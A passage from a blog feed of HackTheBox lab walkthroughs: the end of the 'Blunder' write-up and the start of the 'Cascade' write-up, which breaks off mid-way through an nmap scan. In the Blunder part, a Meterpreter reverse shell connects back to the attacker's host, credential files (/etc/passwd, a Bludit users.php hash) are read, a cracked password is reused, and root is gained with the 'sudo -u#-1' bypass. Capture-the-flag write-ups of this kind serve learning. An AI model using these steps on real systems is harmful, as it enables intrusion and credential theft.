[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.51:4444 -&gt; 10.10.10.191:60776) at 2020-07-05 05:10:52 -0400
[+] Deleted .htaccess

meterpreter &gt; shell
Process 8846 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
</code></pre></div></div>

<h4 id="checking-the-users">Checking the Users</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cat /etc/passwd

shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
</code></pre></div></div>

<h5 id="enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in <code>bl-content/databases</code>.</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www$ cd bludit-3.10.0a
cd bludit-3.10.0a
www-data@blunder:/var/www/bludit-3.10.0a$ ls
ls
LICENSE    bl-content  bl-languages  bl-themes  install.php
README.md  bl-kernel   bl-plugins    index.php
www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content
cd bl-content
www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls
ls
databases  pages  tmp  uploads  workspaces
www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases
cd databases
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
ls
categories.php  plugins       site.php    tags.php
pages.php       security.php  syslog.php  users.php
</code></pre></div></div>

<h4 id="checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the <code>Users.php</code> found the hash of <code>HUGO</code>.</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
</code></pre></div></div>

<h2 id="cracking-the-hash-oh-hugo">Cracking the hash oh HUGO!</h2>

<p><img src="/assets/img/sample//blunder/blunder4.png" alt="" /></p>

<h2 id="logging-in-as-hugo">Logging in as HUGO.</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/home$ su hugo
su hugo
Password: Password120
hugo@blunder:~$
</code></pre></div></div>

<h2 id="grabbing-usertxt">Grabbing User.txt</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$ cat user.txt
cat user.txt
d******************************a
</code></pre></div></div>

<h2 id="time-for-privilege-escalation">Time for Privilege Escalation.</h2>

<p>Checking the sudo permissions of <code>hugo</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
</code></pre></div></div>

<blockquote>
  <p>Escalation of privilege is so simple and stright forward!</p>
</blockquote>

<p><br /></p>

<blockquote>
  <p>https://www.hackingarticles.in/category/privilege-escalation/</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$  sudo -u#-1 /bin/bash 

root@blunder:/# whoami
whoami
root
</code></pre></div></div>

<h2 id="grabbing-roottxt">Grabbing Root.txt</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@blunder:/root# cat root.txt
cat root.txt
8******************************f
</code></pre></div></div>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="linux" /><category term="gobuster" /><category term="bludit" /><summary type="html"><![CDATA[Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!]]></summary></entry><entry><title type="html">HackTheBox Cascade</title><link href="http://localhost:4000/hackthebox/retired/2020/06/26/Cascade.html" rel="alternate" type="text/html" title="HackTheBox Cascade" /><published>2020-06-26T22:09:00+05:30</published><updated>2020-06-26T22:09:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/06/26/Cascade</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/06/26/Cascade.html"><![CDATA[<p>Cascade is a windows machine on Hackthebox, made by VBSCRUB which I personally a big fan of him. This box is one hell of an awsome machine made by him.</p>

<h2 id="info">Info</h2>

<table>
  <thead>
    <tr>
      <th>Cascade</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS:</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Difficulty:</td>
      <td>Medium</td>
    </tr>
    <tr>
      <td>Points:</td>
      <td>30</td>
    </tr>
    <tr>
      <td>Release:</td>
      <td>28 Mar 2020</td>
    </tr>
    <tr>
      <td>IP:</td>
      <td>10.10.10.182</td>
    </tr>
  </tbody>
</table>

<h2 id="lets-start-hacking-into-cascade">Let’s start hacking into <code class="language-plaintext highlighter-rouge">CASCADE</code></h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">A</span> <span class="o">-</span><span class="no">T4</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">vvv</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span>                                                                                                                                                                                      
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span> <span class="no">EDT</span>                                                                                                                                                                            
<span class="no">NSE</span><span class="p">:</span> <span class="no">Loaded</span> <span class="mi">151</span> <span class="n">scripts</span> <span class="k">for</span> <span class="n">scanning</span><span class="o">.</span>                                                                                                                                                                                                      
<span class="no">NSE</span><span class="p">:</span> <span class="no">Script</span> <span class="no">Pre</span><span class="o">-</span><span class="n">scanning</span><span class="o">.</span>                                                                                                                                                                                                                  
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">1</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>                                                                                                                                                                                                      
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>                                                                                                                                                                                                                    
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>                                                                                                                                                                                                      
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">2</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>                                                                                                                                                                                                      
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>                                                                                                                                                                                                                    
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">3</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Initiating</span> <span class="no">SYN</span> <span class="no">Stealth</span> <span class="no">Scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>
<span class="no">Scanning</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span> <span class="p">[</span><span class="mi">1000</span> <span class="n">ports</span><span class="p">]</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">53</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">135</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">139</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49157</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">88</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49165</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">636</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">389</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49158</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Completed</span> <span class="no">SYN</span> <span class="no">Stealth</span> <span class="no">Scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">9.90</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">1000</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
<span class="no">Initiating</span> <span class="no">Service</span> <span class="nb">scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>
<span class="no">Scanning</span> <span class="mi">14</span> <span class="n">services</span> <span class="n">on</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span>
<span class="no">Completed</span> <span class="no">Service</span> <span class="nb">scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span> <span class="mf">56.75</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">14</span> <span class="n">services</span> <span class="n">on</span> <span class="mi">1</span> <span class="n">host</span><span class="p">)</span>
<span class="no">Initiating</span> <span class="no">OS</span> <span class="n">detection</span> <span class="p">(</span><span class="n">try</span> <span class="c1">#1) against cascade.htb (10.10.10.182)</span>
<span class="no">Retrying</span> <span class="no">OS</span> <span class="n">detection</span> <span class="p">(</span><span class="n">try</span> <span class="c1">#2) against cascade.htb (10.10.10.182)</span>
<span class="no">Initiating</span> <span class="no">Traceroute</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span>
<span class="no">Completed</span> <span class="no">Traceroute</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span> <span class="mf">0.22</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Initiating</span> <span class="no">Parallel</span> <span class="no">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">2</span> <span class="n">hosts</span><span class="p">.</span> <span class="nf">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span>
<span class="no">Completed</span> <span class="no">Parallel</span> <span class="no">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">2</span> <span class="n">hosts</span><span class="p">.</span> <span class="nf">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span> <span class="mf">13.11</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">1</span> <span class="no">IPs</span> <span class="n">took</span> <span class="mf">13.11</span><span class="n">s</span><span class="o">.</span> <span class="no">Mode</span><span class="p">:</span> <span class="no">Async</span> <span class="p">[</span><span class="c1">#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Script</span> <span class="n">scanning</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="o">.</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">1</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">99.95</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span><span class="p">,</span> <span class="mf">40.20</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">2</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">97.32</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">98.21</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">55</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">99.11</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">55</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">120.90</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">3</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span>
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="n">set</span> <span class="p">(</span><span class="mf">0.18</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="no">Scanned</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">18</span> <span class="no">EDT</span> <span class="k">for</span> <span class="mi">246</span><span class="n">s</span>
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">986</span> <span class="n">filtered</span> <span class="n">ports</span>
<span class="no">Reason</span><span class="p">:</span> <span class="mi">986</span> <span class="n">no</span><span class="o">-</span><span class="n">responses</span>
<span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">REASON</span>          <span class="no">VERSION</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">DNS</span> <span class="mf">6.1</span><span class="o">.</span><span class="mi">7601</span> <span class="p">(</span><span class="mi">1</span><span class="no">DB15D39</span><span class="p">)</span> <span class="p">(</span><span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="no">SP1</span><span class="p">)</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="ss">nsid: 
</span><span class="o">|</span><span class="n">_</span>  <span class="n">bind</span><span class="p">.</span><span class="nf">version</span><span class="p">:</span> <span class="no">Microsoft</span> <span class="no">DNS</span> <span class="mf">6.1</span><span class="o">.</span><span class="mi">7601</span> <span class="p">(</span><span class="mi">1</span><span class="no">DB15D39</span><span class="p">)</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">49157</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mf">1.0</span>
<span class="mi">49158</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">49165</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="no">Device</span> <span class="ss">type: </span><span class="n">general</span> <span class="n">purpose</span><span class="o">|</span><span class="n">phone</span><span class="o">|</span><span class="n">specialized</span>
<span class="no">Running</span> <span class="p">(</span><span class="no">JUST</span> <span class="no">GUESSING</span><span class="p">):</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">8</span><span class="o">|</span><span class="no">Phone</span><span class="o">|</span><span class="mi">2008</span><span class="o">|</span><span class="mi">7</span><span class="o">|</span><span class="mf">8.1</span><span class="o">|</span><span class="no">Vista</span><span class="o">|</span><span class="mi">2012</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">)</span>
<span class="no">OS</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_8</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_server_2008:r2</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_7</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_8</span><span class="o">.</span><span class="mi">1</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_vista</span><span class="o">::-</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_vista</span><span class="o">::</span><span class="n">sp1</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_server_2012</span>
<span class="no">OS</span> <span class="n">fingerprint</span> <span class="ow">not</span> <span class="n">ideal</span> <span class="ss">because: </span><span class="no">Missing</span> <span class="n">a</span> <span class="n">closed</span> <span class="no">TCP</span> <span class="n">port</span> <span class="n">so</span> <span class="n">results</span> <span class="n">incomplete</span>
<span class="no">Aggressive</span> <span class="no">OS</span> <span class="ss">guesses: </span><span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mf">8.1</span> <span class="no">Update</span> <span class="mi">1</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Phone</span> <span class="mf">7.5</span> <span class="ow">or</span> <span class="mf">8.0</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="ow">or</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="ow">or</span> <span class="no">Windows</span> <span class="mf">8.1</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="no">SP1</span> <span class="ow">or</span> <span class="no">Windows</span> <span class="mi">8</span> <span 